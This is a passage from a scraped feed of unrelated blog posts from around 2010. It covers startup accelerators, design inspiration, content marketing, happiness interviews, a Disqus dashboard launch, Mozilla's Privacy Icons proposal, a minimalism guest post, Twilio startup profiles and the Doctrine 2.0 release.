to bring the community  together. You can count on a big demo day where you’ll have the opportunity to present to who’s who of Silicon Valley. But we’ll also host both large public events like <a href=\"http://warmgun.com\">WarmGun</a> and smaller invite only events like <a href=\"http://inboxlove.com\">InboxLove</a> that help promote your company and expose you to the right people.<br>\n<em>Space</em>: Obviously you can work in your room, in a coffee shop or under a rock and if you want it enough, you can get it without accelerator/incubator drop-in, coworking or dedicated spaces. Either way, hopefully I’m helping you realize why space matters and succeeding in at least persuading you to intentionally re-arrange something in your work setup.</p>\n<p>[<a name=\"diversity\"><strong>Diversity</strong></a>] is part of the secret sauce of innovation, especially when extremes collide on the edges of expertise, philosophies, background, eg <a href=\"http://www.well.com/\">The Well</a>. At 500S we are radically collaborative and attract brilliant entrepreneurs from all walks of life both locally and internationally. Just look at our portfolio and follow Dave’s traveling tweeds- few early stage funds even come close to our diversity.</p>"

      "content" : "<div>\n<p>Achieving beauty (aesthetic, artistic and\nconceptual) is a classic dream for us, creative designers and entrepreneurs. It's a dream about finding the balance between form and function, style and purpose, artistic expression and communication efficiency. </p>\n<p>In design it is sometimes hard to find that balance. Design is essentially a social tool used to introduce a new idea, product or organization to audiences worldwide. Creative people express themselves through design because they want to be part of the process behind creating new products and services. Therefore, the general purpose of design is to integrate an idea or concept in a socially accepted and appealing form of expression (to attach a visual image to the idea).</p>\n<p><strong>If you do that correctly, your work is perfect.</strong></p>\n<p>\n</p>\n<p>Design is like the markup language of a brand image. It sets the mood and tone of your message, it gives your brand a personal and unique style before the magic of growing big happens and it clearly defines the way in which your audience will perceive you - everywhere, anywhere. This is the power of design, and this is why perfection in design can only be achieved when you truly understand who and what you are designing for.</p>\n<div><img alt=\"\" src=\"http://www.velorastudios.com/blogimg/Syntax_error.jpg\" style=\"border:0px\"></div>\n<span>Photo by: <a href=\"http://www.flickr.com/photos/simonpow/252312738/\">Simon Pow</a></span><br>\n</div>\n<p>There are numerous articles and resources on how to design state of the art websites, logos and more. We find really good ones on some the most popular design related websites (that you may know), like <a href=\"http://abduzeedo.com/\">Abduzeedo</a>, <a href=\"http://www.sixrevisions.com/\">Six Revisions</a>, <a href=\"http://www.smashingmagazine.com/\">Smashing Magazine</a> and <a href=\"http://www.behance.net/\">The Behance Network</a>. But\ninspirational resources are neither the means nor the guides one should consider first in his pursuit of perfection.</p>\n<h3>In Design, Perfection Goes Beyond Perception</h3>\n<p>Perfection can be visualized, expressed and imagined. It is something that can be achieved gradually. When you are working on something that you are passionate about, every step you take is a step towards achieving perfection. When you finally finished your design and you feel it is exactly what it should be; it conveys precisely the message it should convey, then you have successfully achieved one level of perfection with it.</p>\n<p><strong>Maybe, instead of keeping too many unreleased works on your digital library shelves, you could really take a second look at them and try to figure out what's the message or the concept behind each of them. Be authentic, finish what you've started and, in the end, something will turn out to be perfect.</strong></p>\n<h3>5 Inspiring TED Talk Videos About Authenticity, Play and Perfection in Design</h3>\n<p>For your pleasure and inspiration, we made a list with 5 of the \"most favorited of all time\" videos on TED, that are both insightful and useful. We thought these videos really help this point come across clearly: beyond everything designed, something is perfect when it makes sense to you, to us and everybody else.</p>\n<br>\n<p><strong>1. Stefan Sagmeister's talk on Happy Design</strong></p>\n<p>This talk teaches us one simple thing: through our work, we need to stay in touch with what makes us feel happy and, if possible, help other people do the same. Our experiences impact our life, and our life experiences are reflected in our style. So why not take the best of it and integrate it in our work, so that every time we create something, it makes sense to us  why we did it in a particular way or why we chose a specific typeface or color. It's like adding bits of our personality to the canvas on which we start building visual representations of the message we try to deliver.</p>\n<div>\n\n\n\n\n\n\n</div>\n<p><strong>2. Stuart Brown says Play Is More than Fun, It's Vital</strong></p>\n<p>Play is essential. It's the fun side of practice and it helps people refine theirs skils and abilities. But as they grow up, most people stop doing that, although they may substitute actual playful activities with something that still stimulates their brain in a joyful manner. Yes, that part is called entertainment.</p>\n<p> The lesson we can learn from this is two-sided: not only do we have to <em>practice playing with ideas</em>, but we also need to understand that meaningful design is playful design, it's engaging and it makes people curious and happy. So play can actually be an easy way to achieve perfection in your work, as a designer.</p>\n<div>\n\n\n\n\n\n</div>\n<p><strong>Don Norman on 3 ways good design makes you happy</strong></p>\n<p>Don Norman speaks about how good it feels to have things that are both beautiful and useful. Make it fun for the user to visit that website, seduce him with things that he may not notice at first, but will always pull him back to your work, like a child to a box of candy. If the user goes \"Oh, that's neat!\" - isn't that what you want to hear? Isn't this better than \"Oh, that is an interesting mix of bright colors and broken lines\"? Yes it is. Why? Because design needs to be experienced. Learn more about it in the video below.</p>\n<div>\n\n\n\n\n\n\n</div>\n<p><strong>4. Marian Bantjes: Intricate beauty by design</strong></p>\n<p>Marian Bantjes speaks great words of wisdom that should resonate with all graphic designers all around the world. One needs to really to connect <em>what they do</em> with <em>why they do it</em>, that is, throwing a personal meaning in one's work. Individuality, written in bold letters all over your design, is more important than the desire to become popular or recognized in the mainstream media. You should figure out what words define you and what concepts excite and inspire you AND use them. Do that and you may just become \"bizzarly popular\".\n</p>\n<div>\n\n\n\n\n\n</div>\n<p><strong>5. Richard St. John: Success is a continuous journey </strong></p>\n<p>This is actually not related to design, but it is so relevant, we couldn't ignore it just because it does not have the word \"design\" in it. One valuable lesson we learn from it goes like this: do not ever stop doing the good job you did before you became succesful. We have said, in the first part of the blog post that you can reach variable and multiple levels of perfection as you design for various projects. Well, the fun part is that, while reaching those, you will have to continue to do that: success is only temporary, perfecting yourself lasts for a lifetime.</p>\n<div>\n\n\n\n\n\n\n\n</div>\n<div>\n<p><strong>Endnote:</strong> The pursuit of perfection in design is not a distant dream. It is achievable, it is recognizable as a process and is repeatable. If this makes sense to you, then it's going to make sense to a lot of other people like you.

      "content" : "<div>\n<p>\nOver and over it's burned into our heads that we need to create unique and remarkable content. How important is it really, and will it always be as essential as it is now? Businesses with big budgets can spend tons of money on SEO, SEM and PPC marketing campaigns, but that is not a substitute for great content. In the long run, the business that spends huge amounts on visitors, but has no quality content will lose to the business with great content. The business with great content can get interested and more importantly <em>motivated</em> visitors without spending money. When visitors see quality content they will tell their friends and networks about it through social media. Paying for eyes is temporary. Content is permanent.\n</p>\n<div><img src=\"http://www.velorastudios.com/blogimg/content-king.jpg\" alt=\"gary vaynerchuk content social media\"></div>\n<span>Photo by: Velora Studios</span><br>\n</div>\n<h3>It's Hard to Build Quality Content</h3>\n<p>Creating great content is not something that everyone can just do. If you are a business owner, a freelance designer or developer, then start by sharing your experiences, tricks and opinions. Provide value to your potential customers with your content. By doing this your visitors will see that you are real, and they will be motivated to choose you over the faceless corporation.</p>\n<p>\nBusiness owners used to think they wouldn't stand a chance against their high-spending competition, but now the playing field has been leveled. If you can create great content then it is actually the other way around. Big ad budgets and high spending can't compete with great content in the long run. With the amount of people consuming content and the amount of devices to view it on increasing all the time, it is more important than ever for businesses to create content.</p>\n<p> Content is supplemented by SEO and PPC, not the other way around. Not only does great content provide credibility for your brand and help with SEO, it builds an audience of followers who are genuinely interested in what you have to say. Traffic from ads goes away when you stop buying them. Content you create lasts forever, and people will continue to find it long after the time it was posted.\n</p>\n<p> Don't try to pull one over on viewers. It's great content that is king, not any content. Avoid trying to get traffic by just talking about the hype and using buzzwords. Sure it may give you a short term boost, but in the end you'll be losing more fans than you gain. Great content comes from skill, experience and being real. It's not something that you can fake.</p>\n<div><img src=\"http://velorastudios.com/blogimg/content-speaking.jpg\" alt=\"web design ted conference speaking\"></div>\n<span>Photo by: <a href=\"http://www.flickr.com/photos/scobleizer/\">Robert Scoble</a></span><br>\n<h2> How Do You Get Started?</h2>\n<h3>1. Talk About your Passion:</h3>\n<p> Tell the world about what you know best. Show them your passion. If you know your passion really well, chances are you will have tons to talk about. Customers love working with people that are passionate about what they do.</p>\n<h3>2. Show Personality:</h3>\n<p> Be yourself, be genuine. You are probably more interesting than you expect. When you show your personality people will feel like they can relate to you and will begin to follow you. </p>\n<h3>3. Teach and Share:</h3>\n<p> Establish yourself as a leader and build credibility. Teach people about what you know. When potential customers or fans see you know your stuff, you'll build credibility with them. Don't be afraid to share some of your best tips or secrets. Your competition isn't going to beat you just because they know a few of your tricks. Ideas are easy, it's implementation that is the hard part.</p>\n<h3>4. Tell a Story:</h3>\n<p>Everyone wants to hear a story and feel like they are a part of something. If you can make your content and brand tell a story to your visitors, or viewers you will be able to grow a very passionate fan base. </p>\n<br>\n<p>At this point hopefully you've been inspired to create some remarkable content of your own. Most of the time though, it's not as simple as build it and they will come. You will have to hustle a little and get your content out there. Engage potential fans, or answer people who are asking questions (even if they aren't necessarily asking you directly). Give your content a good kick out the door and it can start spreading like wildfire. If you can consistently put out quality content then eventually you will get enough dedicated fans that your content will spread more and more on it's own.<br>\n<br>\n</p>\n<div>\n<p><strong>Endnote:</strong> Remember that great content is something that will always be appreciated and it's effects and benefits can last indefinitely. When you create something great, people will want to see it, they will want to share it and you will win. Want some more great content from us?

I know the founders of all of  them. It doesn’t matter. It has nothing to do with you. It’s good to  know the market but the competition is irrelevant. The market is big.  Winning comes by knowing the customer better, executing better, and  continuing to work on the problem after sane people have cashed out. <strong>If a competitor is going to scare you, you shouldn’t have started a business in the first place</strong>. Every big market or successful business will attract competitors anyway. Always assume competition.”</span></span></p></blockquote>\n<p>This was originally published on Quora.

We've met for coffee a few times; because he writes about \"social psychology, self-help culture, productivity and the science of happiness,\" we have a lot of interests in common.</p>\n\n<p>I'm a big fan, so I was pleased to hear that a compilation of his columns was published as a book: <a href=\"http://www.amazon.com/gp/product/B004FN1QDS?ie=UTF8&amp;tag=thehappproj-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957&amp;creativeASIN=B004FN1QDS\">HELP!

I realize that's not staggeringly original, but I sometimes think we invest far too much time and energy looking for staggeringly original happiness strategies. I'm a huge sucker for \"lifehacks\", clever new time management tricks, and all that stuff — but it's crucial to remember that the only sensible measure of their value is this: do they cause you to actually spend more time engaged in the small number of fundamental activities that you already know make you happy?</p>\n\n<p><strong>What’s something you know now about happiness that you didn’t know when you were 18 years old?</strong><br>\nAmong many, many other things: I no longer think of perfectionism as one of those traits you should be secretly quite proud to possess (\"Oh, I'm a perfectionist, yes, I'm just not happy unless I'm producing brilliant work!\"). Perfectionism is 100% bad and evil. As Anne Lamott says, it's \"the voice of the oppressor, the enemy of the people; it will keep you cramped and insane your whole life\". Working as a newspaper journalist on deadline has drummed much of it out of me — there's nothing like a screaming editor to make you abandon all hope of a perfect opening sentence — but it's an ongoing challenge. I guess I shouldn't be perfectionistic about getting rid of perfectionism, though.</p>\n\n<p><strong>Is there anything you find yourself doing repeatedly that gets in the way of your happiness?</strong><br>\nStressing out about potential problems that haven't actually happened yet. Eckhart Tolle recommends asking yourself \"Do you have a problem now?\" — as in, right this very moment? The answer is almost always no. I need to get this tattooed somewhere prominent on my body.</p>\n<strong>\n<p>Is there a happiness mantra or motto that you’ve found very helpful? (e.g., I remind myself to \"Identify the problem.”) </p></strong><br>\nI love the late Japanese psychotherapist Shoma Morita's advice to stop trying to fix yourself and start living instead: \"Give up on yourself. Begin taking action now, while being neurotic or imperfect, or a procrastinator, or unhealthy, or lazy, or any other label by which you inaccurately describe yourself. Go ahead and be the best imperfect person you can be and get started on those things you want to accomplish before you die.\" To some people this sounds depressing, but to me it's the exact opposite: utterly freeing. \n<strong>\n<p>If you’re feeling blue, how do you give yourself a happiness boost? Or, like a “comfort food,” do you have a comfort activity? (mine is reading children’s books).</p></strong><br>\nHonestly? Really good beer, in modest quantities. Perhaps with some good cheese. I know I should say meditation or volunteer work, but as often as not, it's the beer and cheese.\n\n<p><strong>Is there anything that you see people around you doing or saying that detracts a lot from their happiness? </strong><br>\nPositive thinking. I'm certainly not an advocate of pessimism and negativity, but the fixation on achieving exactly the right frame of mind is usually a big distraction from doing what matters, and frequently hugely counterproductive. And don't get me started on the notion that you can \"attract\" things just by thinking the right thoughts. All these efforts at thought control are the exact opposite of the wonderful Buddhist notion of becoming less attached to thoughts, of \"grasping\" them less and thus being grasped by them less. </p>\n<strong>\n<p>Have you ever been surprised that something you expected would make you very happy, didn’t – or vice versa?</p></strong> <br>\nKeeping a gratitude diary. I'm *so* not the kind of person who does corny stuff like that, and I only grudgingly tried it out so that I could write about it and honestly say that I'd given it a shot. Turns out, though, that it's an incredibly effective way to step off the \"hedonic treadmill\" and re-appreciate things that have become so familiar they've stopped giving pleasure. I never thought I'd feel so happy again about a morning cup of coffee or a meal with a friend. It's annoying, but sometimes the cheesiest advice is actually the best.\n\n<p><em>* If your book group is reading <a href=\"http://www.happiness-project.com/happiness_project/the-happiness-project-book.html\">The Happiness Project</a> -- or considering it -- I've prepared a <strong>one-page discussion guide for book group</strong>s, as well as a <strong>guide tailored for church groups, spirituality book groups, and the like</strong>.

Since then, we’ve gotten a lot of feedback from people who use Disqus, not as bloggers, but as commenters. We’re constantly reminded that Disqus has become more than a community-building platform; it’s now also a network of over 20 million commenters.</p>\n\n<p>We’re releasing something today for all of those commenters out there. This is the new user-centric dashboard.</p>\n\n<p><img src=\"http://media.tumblr.com/tumblr_ldje7qdUtd1qz5ese.png\" alt=\"\"></p>\n\n<p>If you’re already logged into Disqus, check it out by heading to <a href=\"http://disqus.com/dashboard\">disqus.com/dashboard</a>. There’s a few new features in here that we’re very excited about.</p>\n\n<h2>Follow people that interest you</h2>\n\n<p>We’ve come across so many comments in Disqus that are hilarious, insightful, or just fascinating to read. Now you can follow the comedians, experts, and storytellers on Disqus. After you choose to follow someone, his or her activity will show up in your dashboard activity stream. (Use the “Context” button to get the full conversation!)</p>\n\n<p><img src=\"http://media.tumblr.com/tumblr_ldje94CHib1qz5ese.png\" alt=\"\"></p>\n\n<p>Like many people, we enjoy following people on Twitter. Twitter lets you stay current with the thoughts and actions of people you find interesting. Similarly, following people on Disqus means that you’re subscribed to their conversations and recommendations as they read and discuss topics online.</p>\n\n<p>To follow someone, just bring up their profile (click on their picture) and click the Follow button. Disqus will also suggest to you people you may want to follow, based on your existing friends on Twitter (Facebook support is coming soon). You can find this on the left side of the dashboard.</p>\n\n<p><img src=\"http://media.tumblr.com/tumblr_ldje9sGpl21qz5ese.png\" alt=\"\"></p>\n\n<h2>A better activity stream</h2>\n\n<p><img src=\"http://media.tumblr.com/tumblr_ldjeasaJU51qz5ese.png\" alt=\"\"></p>\n\n<p>There’s more ! We’ve made some new changes that will make the dashboard more enjoyable to use.</p>\n\n<ul><li>It’s way easier to manage your own comments. Active on a dozen blogs? Use the dashboard to track all the posts you’ve made — you can even edit and remove comments as necessary.</li>\n<li>You know you’re hilarious, but who else thinks so? The new activity stream will show you how many likes you’ve received on your comments, and who liked them.</li>\n<li>The dashboard makes continuing conversations dead simple. You can quickly bring up replies you’ve received, reply to others, and even like comments straight from the dashboard.</li>\n</ul><p>Visit your new dashboard at <a href=\"http://disqus.com/dashboard\">disqus.com/dashboard</a>. Let us know what you think below!</p>"

People from the <a href=\"http://www.ftc.gov/\">FTC</a> to the <a href=\"http://www.eff.org/\">EFF</a> were there to answer the question: What attributes of privacy policies and terms of service <i>should</i> people <a href=\"http://www.azarask.in/blog/post/what-should-matter-in-privacy/\">care about</a>? This lead to a <a href=\"http://www.w3.org/2010/api-privacy-ws/report.html\">proposal presented for the W3C</a>, among other places, which further refined the notion.</p>\n<p>We are now ready to propose an alpha version of Privacy Icons that takes into account the feedback and participation we’ve received along the way. We’ve simplified the core set dramatically and tightened up the language. While the icons don’t touch on all topics, we do think they significantly move the discussion on privacy, as well as the general level of literacy about privacy, forward. We do not want to let perfection or devotion to taxonomy get in the way of the good.</p>\n<p><span></span></p>\n<p>Keep in mind that the target adopters of Privacy Icons are 2nd-tier sites—the sites where differentiation based on privacy matters to their users. Think about the large number of sites which vehemently promise to never share your email address when you sign up for their service or mailing list. Those are the kinds of sites, which make up a significant fraction of the web, that would adopt Privacy Icons.</p>\n<h2>The Icons</h2>\n<p>References to Data mean data that is either personally identifiable (including name, ip address, or email address) or associated with some personally identifiable aspect of your identity (such as correlated with your ip address name, or email address).</p>\n<div><img src=\"https://img.skitch.com/20101222-nt2a3s3bkft4n8si81trwq6ww.png\">\n<p>This means that data is only collected and used to carry out the interaction you are engaged in with the website. The website is only using your data in ways that are functionally necessary to carry out the relationship as users intend. This means if you are buying a pair of shoes, your email address is collected to confirm the order, provide updates on shipping status, etc. An intended use of your email address would not include sending you marketing messages from other companies or for other products.</p>\n<p>The European Union has spent time codifying and refining the idea of <i>secondary use</i>; the use of data for something other than the purpose for which the collectee believes it was collected. <a href=\"http://mint.com\">Mint.com</a> uses your login information to import your financial data from your banks — with your explicit permission. That’s primary use and shouldn’t be punished. The RealAge tests poses as a cute questionnaire and then turns around and sells your data. That’s secondary use, is undisclosed, and feels scummy. When you sign up to use a service you should care if your data will only be used for that service. If the service does use your data for secondary use, they should disclose those uses. If they share your data with 3rd parties, then they should disclose that list too.\n</p>\n</div>\n<div><img src=\"https://img.skitch.com/20101222-8my23a7krc7xjppphnn6xtdyqy.png\">\n<p>This means that your data is collected and used in ways that go beyond what is necessary for the interaction. For example, in addition to collecting your address to ship you a pair of shoes you just bought (which is an intended use of your address), the web site might also sell your address to data aggregators who sell it to junk mail companies.</p>\n</div>\n<p><br></p>\n<div><img src=\"https://img.skitch.com/20101222-egy4n9h9mhqqjp5d4in9n8gfsh.png\">\n<p>The site that is collecting data about you is not trading or selling it. It will only share your data with other organizations in order to carry out the intended transaction.\n</p>\n</div>\n<div><img src=\"https://img.skitch.com/20101222-j383rk9n2ck5eqqp8enx67wctb.png\">\n<p>This means that a website is collecting data about you and selling or trading it with another organization, government, or person. An example of this is where a shopping website collects data about your shopping preferences, frugality, and ip address and sells that info to data aggregators or to other e-commerce sites directly.\n</p>\n</div>\n<p><br></p>\n<div><img src=\"https://img.skitch.com/20101222-t9wrypm8a6enntrd7yb2w4nd5j.png\">\n<p>Besides the information exposed via on-page advertisement, the site does not share the data it collects about you with advertisers.</p>\n</div>\n<div><img src=\"https://img.skitch.com/20101222-n8urf86dpmjh8kebuhde8qaimq.png\">\n<p>This means that a site either shares the data it has about you with marketing or advertising companies or allows those companies to collect info about you while on its site.</p>\n</div>\n<p><br></p>\n<div><img src=\"https://img.skitch.com/20101223-kefj29ics98b9p8e3qek415sx2.png\">\n<p>Your data is deleted before 1, 3, 6, or 18 months from the date of transmission have elapsed, respectively. Alternatively the data is never deleted.</p>\n</div>\n<p><br></p>\n<div><img src=\"https://img.skitch.com/20101222-89614c6bbtcpje1gap2sknf5ke.png\">\n<p>This means that when an organization gets a phone call, letter, or other legally insufficient request for your data, they don’t comply because the law requires the government to take additional steps before getting your data. These organizations require the government to comply, at a minimum, with the legal process provided by the law before getting users’ data.\n</p>\n</div>\n<div><img src=\"https://img.skitch.com/20101222-b7cd4jx6rb7n8w64ikts68a528.png\">\n<p>These organizations might provide your data to a government that asks for it without following the legally required process. They might just send a letter or make a phone call to the company to ask for your data.\n</p>\n</div>\n<p><br></p>\n<h2>Bolt On Approach</h2>\n<div>\n<img src=\"http://img.skitch.com/20100113-n6pudyjgsnfm74ctnmfw9de2nb.png\"></div>\n<p>Privacy policies and Terms of Services are complex documents that encapsulate a lot of situation-specific detail. The Creative Commons approach is to reduce the complexity of sharing to a small number of licenses from which you choose. That simply doesn’t work here: there are too many edge-cases and specifics that each company has to put into their privacy policy. There can be no catch-all boiler-plate.</p>\n<p>Here’s the solution: Have Privacy Icons “bolt on to” an existing privacy policy. When you add a Privacy Icon to your privacy policy it says the equivalent of “No matter what the rest of this privacy policy says, the following is true and preempts anything else in this document…”. The Privacy Icon makes an iron-clad guarantee about some portion of how a company treats your data. This method means that without ever having to delve into the details, everyday people can glance at the simple icons atop a privacy to know if and how their data is being used. At the same time, it gives companies the flexibility required to create comprehensive and meaningful policies.</p>\n<h2>Nobody Will Use the Bad Icons?</h2>\n<div><img src=\"http://img.skitch.com/20100113-f3811h6sq1bcjrwp9she66q6rd.png\"></div>\n<p>Some of the Privacy Icons have potentially poor normative value The question becomes, why would any company display such an icon in their privacy policy? Wouldn’t they instead opt to not use the Privacy Icons at all? This is the largest problem facing the Privacy Icons idea. Aren’t we are creating an incentive system whereby good companies/services will display Privacy Icons and bad companies/services will not?</p>\n<p>First, because the target implementers of Privacy Icons are the second-tier sites, a privacy market-place has a chance of growing. Sites already try to differentiate base on privacy concerns, and these icons simply codify what they are already doing. Second, if Privacy Icons become widely adopted (and I think Mozilla is in a unique position to help make that happen) then the correlation of good companies using the icons and bad companies not using the icons becomes rather strong. The absence of Privacy Icons becomes a warning flag for when you go to sign up for new service.</p>\n<div>\n<p>Note that Mozilla has not yet decided to integrate this into product yet.</p>\n</div>\n<p>Asking people to notice the absence of something may be asking the implausible. People don’t generally don’t notice an absence; just a presence. The solution hinges on <i>Privacy Icons being machine readable</i> and Firefox being used by nearly 500 million people world-wide. If Firefox encounters a privacy policy that doesn’t have Privacy Icons, we’ll can automatically display icon with the poorest guarantees during the sign-up phase when <a href=\"http://www.azarask.in/blog/post/identity-in-the-browser-firefox/\">Firefox implements identity</a>. This way, companies are incentivized to use Privacy Icons and thereby be bound to protecting your privacy appropriately. There are other options as well; like crowd-sourcing tentative Privacy Icons for a website whose privacy policy does have icons yet (and deferring to the company’s as soon as they put them up).</p>\n<h2>Get involved</h2>\n<p>Thoughts, comments, suggestions, and alternate constructive proposals are welcome. This is an alpha proposal for highlighting the parts of a site’s privacy policy you, as a user, <i>should</i> care about.

      "content" : "<h6><strong>Editor’s note</strong>: This is a guest post from Courtney Carver of <a href=\"http://www.bemorewithless.com/\">Be More with Less.</a></h6>\n<p>When I was 16, I wanted more. When I was 24, I wanted even more than that. So, I worked harder, earned more, spent more, to have more, only to owe more. I was exhausted at the end of the day and tired when I woke up most mornings. I ate on the fly, fell behind, ran late and could never catch up. Sound familiar?</p>\n<p>I thought everything I was doing was for a better life. I thought what I was doing was normal and right. I had become so used to bills in the mailbox, and feeling rundown, that I didn’t know anything was wrong. So, how did I go from wanting more, more, more to <em>craving less</em>? I would love to tell you that I woke up one morning a changed person, but that’s not the way it went down. Even though I had begun to make small changes, I needed a wake up call … and it had to be really loud.</p>\n<p>On July, 7th 2006 I was diagnosed with relapsing remitting Multiple Sclerosis. That was my wake up call, and to say it was loud is an understatement. The diagnosis was nothing short of traumatic. I didn’t have enough information to take action. I only knew enough to be really scared. I had so many questions. Could I still ski with my family? Would I be able to help my daughter with homework? Would I even be walking in a year?<span></span></p>\n<p>No one had the answers to those overwhelming questions, so I had to focus on what was most important: my health and my family. Nothing else mattered. If I had moved forward with these big questions and fearful thinking, my daughter and husband would have been so worried. I realized that if I started thinking differently, so would they. My questions went from, “What is this disease going to do to my body and mind?” to “How am I going to reverse MS?”</p>\n<p>The answer to my question was change. Small shifts and big change were necessary to become the best possible version of myself. When I started making changes in my life, I didn’t know that they would lead to minimalism, but they did. In fact, while the changes I made were fighting MS, they were also redefining my whole life. The changes I made are not all essential in the life of a minimalist, but they are all essential to my minimalist lifestyle.</p>\n<h3>What I did to change my life:</h3>\n<p><strong> I became a vegetarian. </strong>Research shows that MS patients, and people dealing with other autoimmune conditions that eat fewer saturated fats and “inflammatory foods” maintain better health. (I would challenge that this goes for most everyone.) Giving up meat was one of the best ways I could really “do something” about my new diagnosis. I stopped eating meat to achieve better health.</p>\n<p>When I started my vegetarian journey, I started reading. I read about raising animals for meat. I read about factory farming. I learned about the impact of our actions on our bodies, animals and the earth. By really opening my eyes and heart to how meat was put on my plate, I lost my appetite for it. <em>I was motivated by health and changed with compassion.</em></p>\n<p><strong>I fell in love with yoga.</strong> Practicing Yoga gives me strength, flexibility, focus, peace of mind and freedom from fear. I want to keep my body strong, and my mind calm and focused so I can effectively fight this disease and take care of my family. While I am in search of less, I want to be more sensitive and loving, more adaptive and more resilient. Yoga gives me that, too.</p>\n<p><strong>I got rid of my stuff. </strong>While I always felt compelled to put something on an empty surface, I have come to love an empty space. It takes living without it to realize how clutter affects your life and takes away from your freedom and creativity. I am reminded of that every time I walk into my kitchen and instead of seeing a cluttered counter, I see sunlight streaming in from the kitchen window. I am still letting go of my stuff and feel lighter everyday.</p>\n<p><strong>I decided to live without debt.</strong> You may not think that your bank account can affect your health, but considering money can cause great stress, and stress can make you sick, it only makes sense that poor money management equals poor health. My husband and I made the decision to be debt free, and paid off our last debt this summer except for our house. What will we do with our money now that we don’t have any monthly payments? <em>Whatever we want.</em></p>\n<p><strong>I hung up the phone. </strong>I do not use my phone when I’m driving anymore. I don’t text at red lights or make calls on the back roads. I can remember too many times where I would arrive at a destination and not remember how I got there because I was so involved in a phone call. Admitting that I had essentially been risking my life and the lives of other drivers wasn’t easy, but it was necessary to make the change and the commitment to be phone free in the car.</p>\n<p>Another benefit is that now, when I pick my daughter up from school, she has my full attention. She doesn’t have to compete with business or other phone fueled distractions. I am there for her.</p>\n<p><strong>I redefined better</strong>. As I mentioned before, all of my bad habits came from wanting something better, something more. In the changes I’ve made, I have redefined what better means to me and my family. The health and happiness of my marriage and family comes before everything else. My husband and I have decided that “more” isn’t the answer for us.</p>\n<p>Now at 41, forever changed, and virtually symptom free, I am becoming me. I know I haven’t figured it all out but am content. I don’t make as much as I used to. I didn’t take a big vacation this year or make any big purchases, but there is no doubt that I am happier. Less speaks to me. Less lets me love more deeply and less lets me really be me.</p>\n<p>My wake up calls have become more subtle, but because I have the time and space to pay attention, I hear them loud and clear. When I first started to practice doing less and being more, I discovered Zen Habits. It was another wake up call, but it sounded like a whisper, “You can do this. You can change.” It is not a coincidence that Leo Babauta’s story of change changed me. I was ready to listen, ready to change.</p>\n<p>The biggest lesson I’ve learned is that less is enough. Of course, I am still learning, still changing and still a work in progress, but now it is my turn to inspire change with my story.</p>\n<p><strong>Read more from Courtney at her blog, <a href=\"http://www.bemorewithless.com/\">Be More with Less</a>, or follow her on <a href=\"http://twitter.com/bemorewithless\">twitter</a>.</strong><br>\n—<br>\n<strong><a href=\"http://twitter.com/home?status=Reading:%20Lessons%20from%20Less%20http://bit.ly/flr6rD%20via%20@zen_habits\">ang Twitter</a>.</strong></p>"

Patrons can see wait times from any computer or smartphone and can join the queue from anywhere, and receive a text or voice message (powered by Twilio!) when their table is almost ready. Textaurant restaurants lose fewer patrons because of long waits, increasing overall revenue, and add dollars to the top line by offering a unique and convenient service.

They even run their own marketing, creating offers and demand generation with technologies like Push Notifications (iOS) and C2DM (Android). Their API processes orders via fax, e-mail, POS, or to any phone number using Twilio. Combined with monthly tiered pricing according to order volumes, this gives OrderMapper universal reach with minimal upfront cost to the business. For app developers, it’s an easy way to integrate mobile ordering into any app. Everything is done through standard GET and POST,  transactions are secure and authenticated. OrderMapper is either supporting or partnering with a range of 3rd party services (e.g. PayPal) to give developers as much freedom and flexibility as possible. And for consumers, the platform delivers the level of choice and convenience they’re increasingly demanding. They use their favorite app to order from their favorite local place,  OrderMapper provides the technology expertise to make it happen.</p>\n<p>Check out a video here of OrderMapper in action:</p>\n<p><iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube.com/v/GbdYBj14ea0?fs%3D1%26hl%3Den_US&amp;width=640&amp;height=385\" width=\"640\" height=\"385\"></iframe></p>\n<p><img src=\"http://twilio.typepad.com/.a/6a0105364227ca970b013488bcb438970c-pi\" alt=\"\" width=\"300\" height=\"239\"></p>\n<p>Order Mapper’s core team includes Jim Bricker (CEO), John Pitocco (CTO), Simon Taghioff (CMO), and Shahryar Khan (Lead Developer). The team launched their white label apps at the International Pizza Expo in March 2010 in Las Vegas.</p>\n<p>Here is Danielle Morrill from Twilio (also a 500 Startups Mentor) demoing OrderMapper:<br>\n<iframe src=\"http://reader.googleusercontent.com/reader/embediframe?src=http://www.youtube.com/v/6RBp4qw9nl4?fs%3D1%26hl%3Den_US&amp;width=480&amp;height=385\" width=\"480\" height=\"385\"></iframe></p>\n<p><a href=\"http://voicendo.com/\"><img title=\"voicendo\" src=\"http://blog.500startups.com/wp-content/uploads/2010/12/voicendo.png\" alt=\"\" width=\"252\" height=\"47\"></a></p>\n<p><a href=\"http://voicendo.com/\">Voicendo</a> provides a user interface for small businesses and independent professionals to manage their incoming phone calls (even SMS) routed according to their easily configured routes!

      "content" : "<div><p>We are happy to announce the immediate release of the first stable Doctrine 2.0 version. This release marks the end of 2.5 years of dedicated development starting in early 2008 and ending as a christmas present to our users. We wish everyone a merry christmas!</p>\n\n<p>During the last years a core team of five people contributed large parts of the code and many developers contributed small patches and features. In the end the Doctrine 1 code was refactored beyond recognition, replacing the original ActiveRecord Doctrine 1 with a new DataMapper implementation. We want to thank all the contributors and early adopters for all the feedback and discussions.</p>\n\n<h2>What is new in Doctrine 2?</h2>\n\n<ul>\n<li>DQL is now a real language inside Doctrine, based on an EBNF that is parsed and transformed to SQL. Benefits of this refactoring are readable error messages, the generation of an AST that allows us to support many different vendors and powerful hooks for developers to modify and extend the DQL language to their needs. DQL can either be written as a string or be generated using a powerful QueryBuilder object.</li>\n<li>Your persistent objects (called entities in Doctrine 2) are not required to extend an abstract base class anymore. Doctrine 2 allows you to use Plain old PHP Objects.</li>\n<li>The UnitOfWork is not an alibi-pattern as implemented in Doctrine 1. It is the most central pattern in Doctrine 2. Instead of calling <code>save()</code> or <code>delete()</code> methods on your <code>Doctrine_Record</code> instances you now pass objects to the data mapper object called <code>EntityManager</code> and it keeps track of all changes until you request a synchronisation between database and the current objects in memory. This process is very efficient and has consistent semantics. This is a significant improvement over Doctrine 1 in terms of performance and developer ease-of-use.</li>\n<li>There are no code-generation steps from YAML to PHP involved in the library anymore. YAML, XML, PHP and Doc-Block Annotations are four first-class citizens for defining the metadata mapping between objects and database. A powerful caching layer allows Doctrine 2 to use runtime metadata without relying on code-generation.</li>\n<li>A clean architecture and powerful algorithms make Doctrine 2 magnitudes faster than Doctrine 1.</li>\n<li>Doctrine 2 supports an API that allows you to transform an arbitrary SQL statements into an 